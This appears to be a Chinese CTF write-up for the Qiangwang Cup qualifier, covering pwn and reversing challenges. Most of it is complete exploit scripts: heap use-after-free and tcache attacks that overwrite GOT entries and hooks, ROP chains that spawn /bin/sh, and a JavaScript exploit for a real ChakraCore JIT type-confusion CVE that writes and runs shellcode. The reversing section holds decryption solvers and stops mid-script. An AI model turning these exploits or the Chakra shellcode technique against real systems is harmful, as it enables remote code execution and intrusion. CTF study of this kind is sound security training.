# 强网杯线上赛Writeup

## PWN

### RANDOM
简单的UAF，fastbin attack打全局list，然后任意地址读写
```python
from pwn import *

debug = 0
if debug:
    p = process('./random')
else:
    p = remote('49.4.66.242', 32150)


def refuse(a=1):
    for x in xrange(a):
        p.sendlineafter('note?(Y/N)', 'N')


def accept():
    p.sendlineafter('note?(Y/N)', 'Y')


def add(size=100, content=None, t=None):
    accept()
    p.sendlineafter('Input the size of the note:', str(size))
    if content:
        if len(content) < size:
            p.sendlineafter('Input the content of the note:', content)
            sleep(0.1)
        else:
            p.sendafter('Input the content of the note:', content)
        if t:
            p.sendlineafter('tomorrow?(Y/N)', 'Y')
        else:
            p.sendlineafter('tomorrow?(Y/N)', 'N')
    


def free_view(id=16):
    accept()
    p.sendlineafter("Input the index of the note:", str(id))


def update(id=16, content=None):
    accept()
    p.sendlineafter("Input the index of the note:", str(id))
    if content:
        p.sendafter("Input the new content of the note:", content)
        sleep(0.1)



def skip(n):
    # smart skip
    for x in xrange(n):
        p.recvuntil("Do you want to ")
        data = p.recvuntil(' ')
        if 'add' in data:
            add()
        elif 'update' in data:
            update()
        else:
            free_view()


p.sendlineafter(':', 'nonick1')
p.recvuntil('nonick1\n')
base = u64(p.recvuntil('?', drop=1).ljust(8, '\x00')) - 0xb90

log.success('base:' + hex(base))

p.sendline('-1')

context.log_level = 'debug'
for x in xrange(9):
    p.sendlineafter('(0~10)', '10')
    skip(10)

p.sendlineafter('(0~10)', '3')
add(0x21, '/bin/sh', 1)
add(0x17, p64(base + 0x1427) * 2 + p64(2)[:-1], 0)  # fake object to update function
add(0x21, 'b' * 0x21, 0)

if debug:
    #gdb.attach(p, 'source bp')
    pass
p.sendlineafter('(0~10)', '0')
add(0x21, p64(0x21)*2, 0)
update(1, p64(base + 0x2031a0).ljust(0x17, '\x00'))  # fastbin attack

p.sendlineafter('(0~10)', '1')
add(0x17,  p64(0x21)*2 , 1)


p.sendlineafter('(0~10)', '0')
free_got=0x203018 
add(0x17, p64(base + 0x203018) + p64(8) , 0)

p.sendlineafter(')', '1')
free_view(3)
p.recvuntil("\n")
libc=p.recvuntil("\n")[:-1]
libc=libc.ljust(8,"\x00")
libc=u64(libc)-0x844f0
system=libc+0x45390

p.sendlineafter('(0~10)', '10')
skip(10)
p.sendlineafter(')', '1')
skip(1) 
p.sendlineafter(')', '1')
update(3, p64(system))  
p.sendlineafter(')', '1')
free_view(0)#
p.interactive()
```
### ONE
abs=-1 leak基地址，usortbin attack打范围，tcache attack劫持控制流
```python
from pwn import *
from struct import pack

context(arch="amd64", os="linux", log_level="debug")
#context.terminal = ["tmux", "splitw", "-h"]
def oio(target):
    global io

    io=process(target)
    io=remote("117.78.48.182",31900)
def ia():
    global io
    io.interactive()
def att():
    gdb.attach(io,"source bp")
def sl(data):
    global io
    io.sendline(str(data))
def se(data):
    global io
    io.send(str(data))
def ru(delim):
    global io
    data=io.recvuntil(delim)
    return data
def rl(len):
    global io
    data=io.recv(len,timeout=1)
    return data
def add(string):
    ru("command>> ")
    sl(1)
    ru("string:")
    sl(string)
    ru("Success!")

def edit(idx,old_chr,new_chr):
    ru("command>> ")
    sl(2)
    ru("Please give me the index of the string:")
    sl(idx)
    ru("Which char do you want to edit:")
    se(old_chr)
    ru("What do you want to edit it into:")
    sl(new_chr)
    ru("Success!")

def feed(idx,size):
    for i in range(size):
        edit(idx,'\x00','\x66')
def show(idx):
    ru("command>> ")
    sl(3)
    ru("Please give me the index of the string:")
    sl(idx)
    ru("The string is:")
    ru("\n")
    return ru("\n")

def delete(idx):
    ru("command>> ")
    sl(4)
    ru("Please give me the index of the string:")
    sl(idx)
    ru("Success!")
def leakbase():
    ru("command>> ")
    sl("12580")
    ru("(Y/N)")
    sl("Y")
    ru("test")
    sl("2147483648")
    ru("The string:\n")
    return ru("\n")
oio("./one")
base=u64(leakbase()[:-1].ljust(8,'\x00'))-0x2030c0
print(hex(base))
add("0"*0x20)
add("1"*0x20)
add("2"*0x20)
add("3"*0x20)
add("4"*0x20)
add("5"*0x20)
add("6"*0x20)
add("7"*0x20)
add("8"*0x20)
add("9"*0x20)
add("0"*0x20)
add("1"*0x20)
add("2"*0x20)
add("3"*0x20)
add("4"*0x20)
add("5"*0x20)
add("6"*0x20)
add('7'*0x10+"hijklmno"+p64(0x21))

edit(17,'o\x00','\x00')
edit(17,'n\x00','\x00')
edit(17,'m\x00','\x00')
edit(17,'l\x00','\x00')
edit(17,'k\x00','\x00')
edit(17,'j\x00','\x00')
edit(17,'h\x20','\x20')
edit(17,'i\x04','\x04')

#att()
feed(0,0x18)
edit(0,'\x00','\x04')
edit(0,'\x41\x21','\x21')

delete(1)
add("1"*0x20) #1
libc=u64(show(2)[:-1].ljust(8,'\x00'))-0x3ebca0
print(hex(libc))


add("8"*0x20)
delete(16)
delete(18)
heap=u64(show(2)[:-1].ljust(8,'\x00'))-0x310
print hex(heap)
add("6"*0x20)
add("8"*0x20)
feed(16,0x18)

edit(16,'\x03\x00','\x00')
edit(16,'\xa1\x41','\x41')
fakechunk=[heap,heap+0x40,heap+0x80,heap+0xc0+0xbb,heap+0x100,heap+0x140,heap+0x180]


for i in range(7):
    print hex(fakechunk[i])
    delete(i+3)
    add(str((i+3))*8+p64(fakechunk[i]))
edit(6,'\xbb\x00','\x00')

delete(10)
add('0'*8+p64(base+0x203160-0x10))
add("")

malloc_hook=libc+0x3ebc30

delete(10)
delete(11)
delete(12)
delete(13)
delete(14)

add("0"*0x20)
add("1"*0x20)
add("2"*0x20)


delete(16)
delete(2)

add(p64(malloc_hook))
add(p64(libc+0x10a38c))
add(p64(libc+0x10a38c))
ru("command>> ")
sl(1)

ia()


```
### DAYBYDAY
提示是feistel但轮函数是异或
```python
from hashlib import md5
from util import *
from binascii import unhexlify as unhex, hexlify as enhex
from Crypto.Util.strxor import strxor

def crack(prefix, dest):
    charz = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+'
    for c0 in charz:
        for c1 in charz:
            for c2 in charz:
                chall = prefix + c0 + c1 + c2
                if md5(chall).digest() == dest:
                    return c0 + c1 + c2

p = pwn('119.3.197.212:12345')
ru = p.recvuntil
rl = lambda:p.recvuntil('\r\n', True)
rn = p.recv
sl = p.sendline
sla = p.sendlineafter

ru('IQ:#')
dest = ru('#', True)
chall = ru('#', True)
print(dest, chall)
pwd = crack(chall, unhex(dest))
sl(pwd)

def menu(i):
    sla('choice:', str(i))

menu(1) # get cipher
cipher1 = unhex(rl())
cipher2 = unhex(rl())
print(enhex(cipher1), enhex(cipher2))

menu(3) # test
sla('L:', '\x00' * 12)
sla('R:', '\x00' * 12)

menu(4) # dayslife
sla('size:', '35')
sla('get it:', 'A' * 11)
t = rn(35 * 2)
t = unhex(t[11 * 2:])
left = t[:12]
right = t[12:]

res = strxor(left + right, cipher1 + cipher2)
ans = md5(res).hexdigest()

menu(2) # get flag
sla('secret:', ans)

p.interactive()
```

`flag{feistel_with_pwn_is_stupid_1111}`
### trywrite
覆盖改写全局list，任意地址读写
```python
from pwn import *
from ctypes import *


def decipher(v, k):
    y = c_uint32(v[0])
    z = c_uint32(v[1])
    sm = c_uint32(0x9e3779b9 * 16)
    delta = 0x9e3779b9
    n = 16
    w = [0, 0]

    while (n > 0):
        z.value -= (y.value << 4) + k[2] ^ y.value + sm.value ^ (y.value >> 5) + k[3]
        y.value -= (z.value << 4) + k[0] ^ z.value + sm.value ^ (z.value >> 5) + k[1]
        sm.value -= delta
        n -= 1

    w[0] = y.value
    w[1] = z.value
    return w


debug = 0

e = ELF('./trywrite.so')


def add(data, key=''):
    p.sendlineafter('>>', '1')
    key = key.ljust(16, '\x00')
    p.sendafter(':', key)
    data = data.ljust(0x80, '\x00')
    p.sendafter(':', data)


def free(id):
    p.sendlineafter('>>', '3')
    p.sendlineafter(':', str(id))


def show(id):
    p.sendlineafter('>>', '2')
    p.sendlineafter(':', str(id))


def update(off1, off2, data):
    p.sendlineafter('>>', '4')
    p.sendlineafter('heap:', str(off1 & 0xffffffffffffffff)[:15])
    p.sendlineafter('key:', str(off2 & 0xffffffffffffffff)[:15])
    data = data.ljust(16, '\x00')
    p.sendafter('key:', data)


def fucktea(data, key='\x00' * 16):
    k = []
    for x in xrange(0, 16, 4):
        k.append(u32(key[x:x + 4]))

    v = []
    for x in xrange(0, len(data), 4):
        v.append(u32(data[x:x + 4]))

    w = decipher(v, k)

    s = ''
    for x in w:
        s += p32(x)
    return s


def leak(ptr):
    update(0x50, 0, p64(ptr - 8))
    gap = ptr - 0x66600000 - 8
    update(gap, -gap, '')
    show(2)
    p.recvline()
    c = fucktea(p.recv(0x80))
    return c


def write(ptr, data):
    update(0x50, 0, p64(ptr))
    gap = ptr - 0x66600000
    update(gap, -gap, data)


if debug:
    p = process('./trywrite', env={'LD_PRELOAD': './trywrite.so'})
else:
    p = remote('117.78.60.139', 30365)

p.sendlineafter(':', str(0x66600000))
p.sendlineafter(')', 'Y')
p.sendline('nonick')
add('nonick0')
add(p64(0x91))
add('nonick2')

update(0x50, 0, p64(0x66600050) + p64(0x11223344))
update(0x49, 0, '\x00\x60\x66'.ljust(7, '\x00') + '\x49')

update(0x50, 0, p64(0x666000b0))

for x in xrange(8):
    add('{}'.format(x))

for x in xrange(7):
    free(3 + x)
free(0)

update(0xb0, 0, '')
show(2)

p.recvline()

encrypted = p.recv(8)
libc = u64(fucktea(encrypted)) - 0x3ebca0

log.success('libc:' + hex(libc))
update(0xb0, 0, p64(libc))
update(0x50, 0, p64(0x666000b8))
update(0xb8, 0, p64(libc) + p64(0xa0))

if debug:
    gdb.attach(p, 'c ')

e.address = libc

write(e.symbols['__free_hook'], p64(e.symbols['system']))
update(0x50, 0, p64(next(e.search('/bin/sh'))))

free(2)

p.interactive()
```

### Childjs
chakra的真实cve，jit的洞导致类型混淆，利用object的属性存储方式不同完成利用。
```javascript=
var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
var f64 = new Float64Array(1);
var i32 = new Int32Array(f64.buffer);
var array_addr_hi, array_addr_lo;
var dv;

var new_dv = new DataView(new ArrayBuffer(0x10));
addressOf(new_dv);

function write32(addr_hi, addr_lo, value) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    DataView.prototype.setInt32.call(dv, 0, value, true);
}

function read32(addr_hi, addr_lo) {
    fake_object[14] = u32_to_i32(addr_lo);
    fake_object[15] = u32_to_i32(addr_hi);
    return DataView.prototype.getInt32.call(dv, 0, true);
}

function read64(addr_hi, addr_low) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + 4);
    return {hi : higher_dword, lo : lower_dword };
}

function print64(int64_value, message){
    print(message + '0x'+ i32_to_u32(int64_value.hi).toString(16) + i32_to_u32(int64_value.lo).toString(16));
}

// Uint32 to Int32
function u32_to_i32(x) {
    if (x >= 0x80000000) {
        return -(0x100000000 - x);
    }
    return x;
}

// Int32 to Uint32
function i32_to_u32(x) {
    if (x < 0) {
        return 0x100000000 + x;
    }
    return x;
}

let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;

function opt(o, s, value) {
    o.a2 = 1;

    if (s !== null) {
        let tmp = 'a'.localeCompare(s);
    }

    o.a1 = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        'a'.localeCompare('x', []);  // Optimize the JavaScript localeCompare
        let o = {a1:{},a2:2.2,a3:3.3,a4:4.4};

        opt(o, null, {});  // for profiling all instructions in opt.

        let o2 = {a1:{},a2:2.2,a3:3.3,a4:4.4};
        try {
            opt(o2, {toString: () => {
                throw 1;  // Don't profile "if (locales === undefined && options === undefined) {"
            }}, {});
        } catch (e) {

        }
    }

    let o = {a1:{},a2:2.2,a3:3.3,a4:4.4};
    let arr=[1.1,2.2,3.3]; //used to get the vtable pointer and type pointer
    let arr2=[1.1,fake_object,f];

    opt(o, {toString: () => {
        o.c = 123;;
    }}, arr);
    let native_float_arr_vtable=o.a3;
    let native_float_arr_type = o.a4;

    let o2 = {a1:{},a2:2.2,a3:3.3,a4:4.4};
    opt(o2, {toString: () => {
        o2.c = 123;;
    }}, arr2);

    let var_array_vtable=o2.a3;
    let var_array_type=o2.a4;
    //transform a var array to native float array
    o2.a3=native_float_arr_vtable;
    o2.a4=native_float_arr_type;

    f64[0]=arr2[2];

    var f_lo = i32[0], f_hi = i32[1];
    print64({hi:f_hi, lo:f_lo}, '[*] function address:');

    f64[0]=arr2[1];
    var base_lo = i32[0], base_hi = i32[1];
    i32[0] = base_lo + 0x58;
    print64({hi:i32[1], lo:i32[0]}, '[*] fake_object address:');
    arr2[1] = f64[0];

    // Construct our fake DataView
    // vtable
    fake_object[0] = base_lo + 0x58 - 0xb0 + 0x20;  fake_object[1] = base_hi;
    // Type*
    fake_object[2] = base_lo + 0x68;         fake_object[3] = base_hi;
    // (TypeId for fake Type object)
    fake_object[4] = 58;                     fake_object[5] = 0;
    // (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
    fake_object[6] = base_lo + 0x58 - 0x430; fake_object[7] = base_hi;
    // Buffer size
    fake_object[8] = 0x200;                  fake_object[9] = 0;
    // ArrayBuffer pointer, +0x3C IsDetached
    fake_object[10] = base_lo + 0x58 - 0x20 + 20; fake_object[11] = base_hi;
    // Buffer address
    fake_object[14] = base_lo + 0x58;        fake_object[15] = base_hi;

    addressOf(fake_object);
    array_addr_hi = i32_to_u32(base_hi);
    array_addr_lo = i32_to_u32(base_lo);

    o2.a3=var_array_vtable;
    o2.a4=var_array_type;

    dv=arr2[1];
    addressOf(dv);
    var f_leak_int64 = { hi :f_hi, lo : f_lo };
    print64(f_leak_int64, '[*] wasm obj address:');
    pause();

    var shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];
    var start=array_addr_lo-0x100;
    for(let i = 0; i < shellcode.length; i++) {
        write32(array_addr_hi,start,shellcode[i]);
        start=start+4;
    }

    var f_ptr = read64(f_hi, f_lo+0x8);
    //Modify its function pointer to the address of the shellcode
    write32(f_ptr.hi,f_ptr.lo+0x18,array_addr_lo-0x100);
    write32(f_ptr.hi,f_ptr.lo+0x1c,array_addr_hi);
    //Get shell
    f();


}

main();
```
### babycpp
abs(0x80000000)造成上溢出，type confuse之后任意地址读写
```python=
from pwn import *
from config import *

debug = 0

libc=ELF('./babycpp.libc')

def new(type):
    p.sendlineafter('choice:', '0')
    if type == 's':
        p.sendlineafter('choice:', '2')
    elif type == 'i':
        p.sendlineafter('choice:', '1')
    else:
        p.sendlineafter('choice:', '2')


def show(hash, idx):
    p.sendlineafter('choice:', '1')
    hash = hash.ljust(16, '\x00')
    p.sendafter('hash:', hash)
    p.sendlineafter('idx:', str(idx))


def set_str(hash, idx, data, length=None):
    if not length:
        length = len(data)

    p.sendlineafter('choice:', '2')
    hash = hash.ljust(16, '\x00')
    p.sendafter('hash:', hash)
    p.sendlineafter('idx:', str(idx))
    c = p.recvuntil(':')
    if 'content' in c:
        p.send(data)
    else:
        p.sendline(str(length))
        p.sendlineafter('content:', data)


def set_int(hash, idx, data):
    p.sendlineafter('choice:', '2')
    hash = hash.ljust(16, '\x00')
    p.sendafter('hash:', hash)
    p.sendlineafter('idx:', str(idx))
    p.sendlineafter('val:', hex(data)[2:])


def update_hash(hash, idx, data):
    p.sendlineafter('choice:', '3')
    hash = hash.ljust(16, '\x00')
    p.sendafter('hash:', hash)
    p.sendlineafter('idx:', str(idx & 0xffffffff))
    p.sendafter('hash:', data)
    sleep(0.2)

while 1:
    try:
        if debug:
            p = process('./babycpp', env={'LD_PRELOAD': './babycpp.libc'})
        else:
            p = remote('49.4.26.104', 30817)

        new('s')
        new('i')

        set_str('\x00', 0, 'nonick')

        update_hash('\x00', 0x80000000, '\xe0\xec')  # type confusion
        show('\x00', 0)
        p.recvuntil('The value in the array is ')
        heap = int(p.recvuntil('\n', drop=1), 16)
        log.success('heap:' + hex(heap))

        set_int('\x00', 0, heap - 0x90)
        set_int('\x01', 0, heap - 0xc0)
        set_int('\x01', 1, 0x40)
        update_hash('\x00', 0x80000000, '\x00\xed')  # type confusion
        show('\x00', 0)
        p.recvuntil('Content:')
        base = u64(p.recvuntil('\n', drop=1).ljust(8, '\x00')) - 0x201CE0
        log.success('base:' + hex(base))

        set_int('\x01', 0, base + 0x201F90)
        show('\x00', 0)
        p.recvuntil('Content:')
        libc.address = u64(p.recvuntil('\n', drop=1).ljust(8, '\x00'))-libc.symbols['printf']

        log.success('libc:'+hex(libc.address))
        set_int('\x01', 0, libc.symbols['__realloc_hook'])
        set_str('\x00', 0, p64(libc.address+0x4f322)+p64(libc.symbols['realloc']+2))
        new('s')
        p.interactive()
    except:
        p.close()
```
### warmup
修改got到execve，排布参数后调用
```python=
from pwn import *
from config import *
from struct import pack

debug = 0
pivot_esp = 0x804A040
libc_start_main_got = 0x804A00C
libc_start_main_plt = 0x80482C0
pop_ebx = 0x08048636
add_esi_ebp = 0x08048517
# 0x08048436: add  [ebx+0x453BFC45], ecx ; adc byte [esi-0x70], bh ; leave  ; ret  ;
add_ebx_ecx = 0x08048436
# 0x08048616: les ecx,  [ebx+ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
les_ecx_ebx3 = 0x08048616

ecx_addr = 0x0804a0a7 + 9
binsh = pivot_esp + 0x50
ebx_val = ecx_addr / 3

payload = p32(0x08048618)
payload += p32(0x804a09c)
payload += p32(0x804a0a4)
payload += p32(0x804a0a7)
payload += p32(0)

payload += p32(pop_ebx)
payload += p32(ebx_val)
payload += p32(les_ecx_ebx3)
payload += p32(0x804A040 + 0x100)
payload += p32(0)
payload += p32(0x804a078 - 4)
payload += p32(pop_ebx)
payload += p32((libc_start_main_got - 0x453BFC45) & 0xffffffff)
payload += p32(add_ebx_ecx)
payload += p32(0x08048517)
payload += p32(0x804a070)
payload += p32(pivot_esp + 4)
payload += p32(libc_start_main_plt)
payload += p32(0)
payload += p32(0x804a09c)
payload += p32(0x804A044)
payload += p32(0)
payload += p32(0)
payload += '/bin/sh\x00'
payload += '-c\x00'
payload += 'cat */*'
payload += "\x00" * 2
payload += p32(0xBE350  - 0x18D90)

assert len(payload) <= 128
log.success(payload.encode('hex'))

if debug:
    p = process(['./xx_warm_up', payload.encode('hex')])
else:
    p = remote('49.4.30.253', 31337)
    pre = p.recvuntil('\n', drop=1)

    log.info('pre:' + pre)

    p.send(fuckauth2(pre))
    p.info('Autn sent')
    p.sendline(payload.encode('hex'))

p.interactive()
```
### 强网ap
emm，签到pwn
```python=
from pwn import *

debug = 0

if debug:
    p = process('./task_main')
    e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('49.4.66.242', 32012)
    e = ELF('./2.23.so')


def get(length, data):
    p.sendlineafter('>>', '1')
    p.sendlineafter(':', str(length))
    if len(data) < length - 1:
        p.sendlineafter(':', data)
    else:
        p.sendafter(':', data)


def open(id):
    p.sendlineafter('>>', '2')
    p.sendlineafter('?', str(id))


def change(id, length, data):
    p.sendlineafter('>>', '3')
    p.sendlineafter('?', str(id))
    p.sendlineafter(':', str(length))
    if len(data) < length:
        p.sendlineafter(':', data)
    else:
        p.sendafter(':', data)


get(0x18, 'a' * 0x17)
get(0x18, '/bin/sh\x00'.ljust(0x17, '\x00'))
change(0, 0x21, 'c' * 0x20)
open(0)
p.recvuntil('c' * 0x20)
heap = u64(p.recvuntil('\n', drop=1).ljust(8, '\x00'))
log.success('heap:' + hex(heap))

change(0, 0x29, 'c' * 0x28)
open(0)
p.recvuntil('c' * 0x28)
libc = u64(p.recvuntil('\n', drop=1).ljust(8, '\x00'))

e.address = libc - e.symbols['puts']
log.success('libc:' + hex(e.address))
if debug:
    gdb.attach(p)

change(0, 0x31, 'c' * 0x20 + p64(heap) + p64(e.symbols['system']))
open(1)
p.interactive()
```
### babymimic
payload同时打通32 和 64即可
```python=
from pwn import *
from config import *
from struct import pack

debug = 0

if debug:
    p = process('./stkof64')
    gdb.attach(p)
else:

    p = remote('49.4.51.149', 25391)
    p.recvuntil('[+]hashlib.sha256(skr).hexdigest()=')
    hash = p.recvuntil('\n', drop=1).strip()
    log.info('hash:' + hash)
    p.recvuntil('skr[0:5].encode(\'hex\')=')
    pre = p.recvuntil('\n', drop=1).strip()
    log.info('pre:' + pre)

    p.sendline(fuckauth(pre, hash))
    p.info('Autn sent')
    p.sendlineafter('[+]teamtoken:', gettoken())


payload = '\x00' * 272 + p32(0x0806b225) * 2

### 64

payload += pack('<Q', 0x0000000000405895)  # pop rsi ; ret
payload += pack('<Q', 0x00000000006a10e0)  # @ .data
payload += pack('<Q', 0x000000000043b97c)  # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x000000000046aea1)  # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000405895)  # pop rsi ; ret
payload += pack('<Q', 0x00000000006a10e8)  # @ .data + 8
payload += pack('<Q', 0x0000000000436ed0)  # xor rax, rax ; ret
payload += pack('<Q', 0x000000000046aea1)  # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x00000000004005f6)  # pop rdi ; ret
payload += pack('<Q', 0x00000000006a10e0)  # @ .data
payload += pack('<Q', 0x0000000000405895)  # pop rsi ; ret
payload += pack('<Q', 0x00000000006a10e8)  # @ .data + 8
payload += pack('<Q', 0x000000000043b9d5)  # pop rdx ; ret
payload += pack('<Q', 0x00000000006a10e8)  # @ .data + 8
payload += pack('<Q', 0x000000000043b97c)  # xor rax, rax ; ret
payload += pack('<Q', 0x3b)  # add rax, 1 ; ret
payload += pack('<Q', 0x0000000000461645)  # syscall ; ret

payload += 'a' * 108

payload += pack('<I', 0x0806e9cb)  # pop edx ; ret
payload += pack('<I', 0x080d9060)  # @ .data
payload += pack('<I', 0x080a8af6)  # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x08056a85)  # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806e9cb)  # pop edx ; ret
payload += pack('<I', 0x080d9064)  # @ .data + 4
payload += pack('<I', 0x080a8af6)  # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x08056a85)  # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806e9cb)  # pop edx ; ret
payload += pack('<I', 0x080d9068)  # @ .data + 8
payload += pack('<I', 0x08056040)  # xor eax, eax ; ret
payload += pack('<I', 0x08056a85)  # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9)  # pop ebx ; ret
payload += pack('<I', 0x080d9060)  # @ .data
payload += pack('<I', 0x0806e9f2)  # pop ecx ; pop ebx ; ret
payload += pack('<I', 0x080d9068)  # @ .data + 8
payload += pack('<I', 0x080d9060)  # padding without overwrite ebx
payload += pack('<I', 0x0806e9cb)  # pop edx ; ret
payload += pack('<I', 0x080d9068)  # @ .data + 8
payload += pack('<I', 0x08056040)  # xor eax, eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x0807be5a)  # inc eax ; ret
payload += pack('<I', 0x080495a3)  # int 0x80

p.sendlineafter('?', payload)
p.recvline()
p.recvline()

p.interactive()
```

## RE
### JUSTRE

第一段是smc解密的密钥, 第二段是3DES.
```python
from Crypto.Cipher import DES3
from struct import pack

cipher = [0x80B899BD, 0xEF95C26D]
plain = [0x83EC8B55, 0xEC81F0E4]

for ch in xrange(0x100):
    ch2 = ch * 0x01010101
    a = cipher[0]
    b = plain[0]
    t = (ch2 + a) & 0xFFFFFFFF
    dw = b ^ t

    a = cipher[1]
    b = plain[1]
    t = (ch2 + a) & 0xFFFFFFFF
    dw2 = b ^ t

    if dw2 == dw + 1:
        break

key = 'AFSAFCEDYCXCXACNDFKDCQXC'
cipher = pack('<4I', 0xE6A97C50, 0xFACE0987, 0xCF0DD520, 0x6C97BB90)
des = DES3.new(key)
plain = des.decrypt(cipher)

print('%08X%02X%s'%(dw, ch, plain))
```

`flag{13242298100dcc509a6f75849b}`



### WEBASSEMBLY
xtea
```python
from struct import pack, unpack
def xtea_decrypt(key,block,n=32,endian="<"):
    v0, v1 = unpack("<2L", block)
    k = unpack("<4L", key)
    delta, mask = 0x9e3779b9,0xffffffff
    sm = (delta * n) & mask
    for _ in range(n):
        v1 = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sm + k[sm>>11 & 3]))) & mask
        sm = (sm - delta) & mask
        v0 = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sm + k[sm & 3]))) & mask
    return pack("<2L",v0,v1)

key = '\x00' * 16
cipher = str(bytearray([0x95, 0x96, 0x68, 0xE7, 0xB7, 0x55, 0x17, 0xC9, 0xAD, 0x03, 0x1E, 0xCF, 0x6F, 0xC5, 0x61, 0x4B, 0x02, 0x90, 0xFD, 0x2D, 0x22, 0xED, 0x0A, 0x93, 0x30, 0x7E, 0xC9, 0xEC, 0x8C, 0x96, 0xB1, 0xE0]))

s = ''
for i in xrange(0, len(cipher), 8):
    plain = xtea_decrypt(key, cipher[i:i+8])
    s += plain
s += str(bytearray([0x65, 0x36, 0x38, 0x62, 0x62, 0x7D]))
print(s)
```

`flag{1c15908d00762edf4a0dd7ebbabe68bb}`



### BORINGCRYPTO
AES+DES+RC4+TEA+TwoFish
```python
from twofish import Twofish
from struct import pack, unpack
from ctypes import *
from Crypto.Cipher import AES, DES, ARC4

key = '415c7919c5946af18007327644ae4b872891d905ccfb065767bcc8440c730885'.decode('hex')

cipher = [0x82, 0xBB, 0x4A, 0x14, 0x72, 0x38, 0xF5, 0x01, 0xC9, 0xE7, 0x00, 0x06, 0x45, 0xD5, 0x91, 0x5C, 0x5A, 0xEC, 0x37, 0x68, 0x6D, 0x35, 0x87, 0xC8, 0x0C, 0x87, 0xE1, 0xDA, 0x65, 0x89, 0x95, 0xEB, 0xEA, 0x79, 0x49, 0x16, 0xED, 0xA2, 0x99, 0x31, 0xB0, 0x99, 0x2D, 0xFB, 0x72, 0x9F, 0xA6, 0x75, 0x99, 0xBB, 0xD4, 0xA3, 0x09, 0x8F, 0x28, 0x73, 0xB1, 0x35, 0x5B, 0x09, 0x3D, 0x56, 0xA8, 0x81, 0x3E, 0xB9, 0x47, 0xE5, 0x9B, 0xC4, 0x6F, 0x36, 0x28, 0x1D, 0x61, 0x7B, 0xF3, 0x31, 0x4A, 0xB1]
cipher = bytes(bytearray(cipher))

tfkey = key[:]
tf = Twofish(tfkey)
plain = tf.decrypt(cipher)

def decipher(v, k):
    y = c_uint32(v[0])
    z = c_uint32(v[1])
    sm = c_uint32(0xc6ef3720)
    delta = 0x9e3779b9
    n = 32
    w = [0,0]

    while(n>0):
        z.value -= ( y.value << 4 ) + k[2] ^ y.value + sm.value ^ ( y.value >> 5 ) + k[3]
        y.value -= ( z.value << 4 ) + k[0] ^ z.value + sm.value ^ ( z.value >> 5 ) + k[1]
        sm.value -= delta
        n -= 1

    w[0] = y.value
    w[1] = z.value
    return w

teakey = unpack('<4I', key[:0x10])[:4]

cipher = plain[:-0x10]
plain = ''
for i in xrange(0, len(cipher), 8):
    v = unpack('<2I', cipher[i:i+8])
    t = decipher(v, teakey)
    plain += pack('<2I', t[0], t[1])


cipher = plain[:-8]
arc4key = key
arc4 = ARC4.new(key)
plain = arc4.encrypt(cipher)


cipher = plain
deskey = key[:8]
des = DES.new(deskey)
plain = des.decrypt(plain)


cipher = plain[:-8]
aeskey = key
aes = AES.new(key)
plain = aes.decrypt(cipher)

plain = plain[:-0x10]
print(plain)
print(plain.encode('base64'))
```

`flag{17_!$_ANnNNN_8OR|ng_CrYpTO}`



### 设备固件
虚拟机
```assembly
mov r0, 0x20
mov r1, 0
mov r2, 1

cmp r1, r0
je loc1

mov rB, 0
mov rC, 0

loc2:
add rC, rB
cmp rB, r1
add rB, r2
jne loc2

mov r3, 8
mov r4, 6
mov r9, 0x10
shl r9, r3
mov rA, 0x24
add r9, rA
add r9, rC
mov r5, input[r1]
mul r5, r9
mov r6, r5

shr r6, r4
mov r7, const[r1]
cmp r6, r7
add r1, r2
```
```python
secret = [0xC5B, 0xCDD, 0xD1F, 0x18C0, 0x18C6, 0xC26, 0xE72, 0xDF7, 0x19B1, 0xD41, 0xD08, 0x191C, 0xCD9, 0xEB1, 0xCEE, 0x1A78, 0xD8B, 0xD99, 0xD64, 0xCED, 0x19F8, 0xE61, 0x1A7F, 0x1AE7, 0xF26, 0x1B34, 0x1AD0, 0xD7C, 0xFC9, 0xE7E, 0x1C0E, 0x1BAE]

pwd = ''
for i in xrange(0x20):
    k = i * (i + 1) / 2
    r = None
    for c in xrange(0x20, 0x7F):
        t = ((k + 0x1024) * c) >> 6
        if t == secret[i]:
            r = c
            break
    assert r != None
